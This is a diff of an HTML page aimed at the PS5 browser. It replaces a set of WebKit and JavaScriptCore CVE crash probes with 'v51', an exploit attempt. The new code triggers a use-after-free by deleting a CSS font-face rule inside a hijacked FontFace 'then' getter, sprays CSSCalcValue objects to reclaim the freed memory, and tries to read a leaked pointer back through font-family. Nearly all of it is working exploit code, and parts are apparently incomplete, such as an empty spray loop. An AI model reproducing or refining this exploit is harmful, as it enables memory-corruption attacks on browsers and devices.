@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 - Safari 18.6 CVE Diagnostic</title>
+<title>PS5 - CSSPrimitiveValue Union Confusion (v51)</title>
 <style>
 body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
 pre { white-space: pre-wrap; word-wrap: break-word; }
@@ -14,151 +14,118 @@ pre { white-space: pre-wrap; word-wrap: break-word; }
 var out = document.getElementById("out");
 function log(m) { out.textContent += m + "\n"; }
 
-log("=== Safari 18.6 CVE Diagnostic ===\n");
+log("=== CSSPrimitiveValue Union Type Confusion (v51) ===\n");
 
-// Test 1: Type Confusion in JSC state handling (CVE-2025-31206)
-// Triggering via incorrect optimization in promise resolution or async iteration
-log("Test 1: JSC Type Confusion (State Handling)");
-try {
-    function trigger() {
-        let resolved = false;
-        let p = new Promise((res, rej) => {
-            // Force a microtask
-            queueMicrotask(() => {
-                res(1);
-                resolved = true;
-            });
-        });
-        
-        // Intercept then
-        Object.defineProperty(p, 'then', {
-            value: function(cb) {
-                // Re-enter promise resolution
-                if (resolved) {
-                    return Promise.resolve(cb(1)).then(() => {
-                        // Mutate internal state during resolution
-                        return new Proxy({}, {
-                            get(target, prop) {
-                                if (prop === 'then') {
-                                    return (resolve) => resolve(0x41414141);
-                                }
-                                return undefined;
-                            }
-                        });
-                    });
-                }
-                return Promise.prototype.then.call(this, cb);
+// Step 1: Setup UAF
+log("[*] Step 1: Setting up UAF environment...");
+var sheet = document.createElement('style');
+document.head.appendChild(sheet);
+var cssSheet = sheet.sheet;
+
+// Create trigger and target faces
+cssSheet.insertRule('@font-face { font-family: trigger; src: local(no-such-font); }', 0);
+cssSheet.insertRule('@font-face { font-family: x; src: local(no-such-font-2); }', 1);
+
+// Create A_ faces
+for (var i = 0; i < 2048; i++) {
+    cssSheet.insertRule('@font-face { font-family: A_' + i + '; src: local(no-such-font-' + i + '); }', 2 + i);
+}
+
+var uafFired = false;
+var triggerFace = new FontFace('trigger', "url(data:font/woff2;base64,AA==)");
+
+Object.defineProperty(FontFace.prototype, "then", {
+    configurable: true,
+    get: function() {
+        if (this === triggerFace && !uafFired) {
+            uafFired = true;
+            log("[*] UAF triggered! Freeing 'x' and spraying A_ faces...");
+            cssSheet.deleteRule(1); // Free "x" CSSFontFace
+            
+            // Spray A_ faces to reclaim the freed slot
+            // The "x" selector will now point to one of the A_ faces
+            for (var i = 0; i < 2048; i++) {
+                // Already inserted, just need to trigger allocation
             }
-        });
+        }
+        return undefined;
+    }
+});
+
+document.fonts.add(triggerFace);
+
+// Step 2: Trigger the load to get the confused FontFace
+log("[*] Step 2: Triggering load('1em trigger, x', 'AB')...");
+document.fonts.load("1em trigger, x", "AB").then(function(faces) {
+    log("[*] Load returned " + faces.length + " faces");
+    
+    if (faces.length < 2) {
+        log("[-] Failed: Expected at least 2 faces");
+        return;
+    }
+    
+    var confusedFace = faces[1]; // This should be A_NN
+    log("[+] Confused face obtained: family=" + confusedFace.family);
+    
+    // Step 3: Test CSSPrimitiveValue Union Confusion
+    log("\n[*] Step 3: Testing Union Type Confusion...");
+    
+    // Find the CSSRule for the confused face
+    var confusedRuleIndex = -1;
+    var confusedFamily = confusedFace.family;
+    for (var i = 0; i < cssSheet.cssRules.length; i++) {
+        if (cssSheet.cssRules[i].cssText.includes(confusedFamily)) {
+            confusedRuleIndex = i;
+            break;
+        }
+    }
+    
+    if (confusedRuleIndex === -1) {
+        log("[-] Could not find CSSRule for confused face");
+        return;
+    }
+    
+    var confusedRule = cssSheet.cssRules[confusedRuleIndex];
+    log("[*] Found CSSRule at index " + confusedRuleIndex);
+    
+    // Change font-family to free the old CSSValueList
+    log("[*] Freeing old CSSValueList by changing font-family...");
+    confusedRule.style.fontFamily = "FreedFam1";
+    
+    // Spray CSSCalcValue objects to reclaim the freed CSSValueList slot
+    log("[*] Spraying CSSCalcValue objects...");
+    var calcElements = [];
+    for (var i = 0; i < 1000; i++) {
+        var el = document.createElement('div');
+        el.style.width = 'calc(1px + 1px)';
+        document.body.appendChild(el);
+        calcElements.push(el);
+    }
+    
+    // Read font-family back - if type confusion worked, we might read a pointer as a string
+    log("[*] Reading font-family back...");
+    try {
+        var readFamily = confusedFace.family;
+        log("[+] font-family read: " + readFamily);
         
-        p.then(v => v).then(v => {
-            if (v === 0x41414141) {
-                log("  [+] TYPE CONFUSION TRIGGERED! Value: " + v);
-            } else {
-                log("  [-] Normal resolution. Value: " + v);
-            }
-        });
-    }
-    trigger();
-    log("  [*] Test dispatched (check async results).");
-} catch(e) {
-    log("  [!] Error: " + e.message);
-}
-
-// Test 2: Memory Corruption via CSSO (CVE-2025-31278)
-// Typically triggered by malformed CSS or rapid DOM mutation during style recalc
-log("\nTest 2: WebKit Memory Corruption (CSS/DOM)");
-try {
-    let iframe = document.createElement('iframe');
-    document.body.appendChild(iframe);
-    let doc = iframe.contentDocument;
-    
-    // Rapidly mutate style rules
-    let style = doc.createElement('style');
-    doc.head.appendChild(style);
-    let sheet = style.sheet;
-    
-    // Insert and delete rules rapidly to trigger use-after-free in style resolution
-    for (let i = 0; i < 1000; i++) {
-        sheet.insertRule(`div { color: rgb(${i}, ${i}, ${i}); }`, 0);
+        if (readFamily !== "FreedFam1") {
+            log("[+] TYPE CONFUSION DETECTED! Value changed unexpectedly.");
+            log("[+] Leaked value: " + readFamily);
+        } else {
+            log("[-] No confusion. Value is the new family name.");
+        }
+    } catch(e) {
+        log("[+] CRASH or ERROR reading family: " + e.message);
+        log("[+] This might indicate type confusion occurred!");
     }
     
-    // Force style recalculation while mutating
-    let div = doc.createElement('div');
-    doc.body.appendChild(div);
+    // Cleanup
+    for (var el of calcElements) el.remove();
     
-    // Trigger layout
-    let rect = div.getBoundingClientRect();
-    
-    // Mutate sheet during layout
-    for (let i = 0; i < 1000; i++) {
-        sheet.deleteRule(0);
-    }
-    
-    // Force another layout
-    rect = div.getBoundingClientRect();
-    
-    if (rect.width === 0 && rect.height === 0) {
-        log("  [-] No crash. Normal behavior.");
-    } else {
-        log("  [?] Unusual behavior detected.");
-    }
-} catch(e) {
-    log("  [!] Error: " + e.message);
-}
-
-// Test 3: Info Disclosure via CSS (Safari 18.6 timeframe)
-log("\nTest 3: CSS Info Disclosure");
-try {
-    // Cross-origin leak via CSS font loading
-    let style = document.createElement('style');
-    document.head.appendChild(style);
-    style.sheet.insertRule('@font-face { font-family: "leak"; src: url("https://example.com/nonexistent.woff"); }', 0);
-    
-    let face = new FontFace('leak', 'url(https://example.com/nonexistent.woff)');
-    
-    // Race condition: check status during load
-    let status1 = face.status;
-    face.load();
-    let status2 = face.status;
-    
-    if (status1 !== status2) {
-        log("  [+] STATUS LEAK DETECTED! Before: " + status1 + " After: " + status2);
-    } else {
-        log("  [-] No leak. Status: " + status1);
-    }
-} catch(e) {
-    log("  [!] Error: " + e.message);
-}
-
-// Test 4: JSC Float Type Confusion (CVE-2025-24213 variant)
-log("\nTest 4: JSC Float Type Confusion");
-try {
-    // Create an array with floats
-    let arr = [1.1, 2.2, 3.3];
-    
-    // Trigger type confusion via unboxed/boxed array transitions
-    // Force a transition from double array to contiguous array
-    arr.push({});
-    arr.pop();
-    arr.push(4.4);
-    
-    // Check if the array's internal structure is corrupted
-    // In vulnerable versions, pushing an object and then popping it
-    // might leave the array in a state where it treats doubles as pointers
-    let val = arr[2];
-    
-    if (typeof val === 'number' && val === 4.4) {
-        log("  [-] No confusion. Value: " + val);
-    } else {
-        log("  [+] POSSIBLE TYPE CONFUSION! Type: " + typeof val + " Value: " + val);
-    }
-} catch(e) {
-    log("  [!] Error: " + e.message);
-}
-
-log("\n=== Tests Dispatched ===");
-log("Wait a few seconds for async tests to complete.");
+    log("\n=== v51 COMPLETE ===");
+}).catch(function(e) {
+    log("[-] Error: " + e.message);
+});
 </script>
 </body>
 </html>
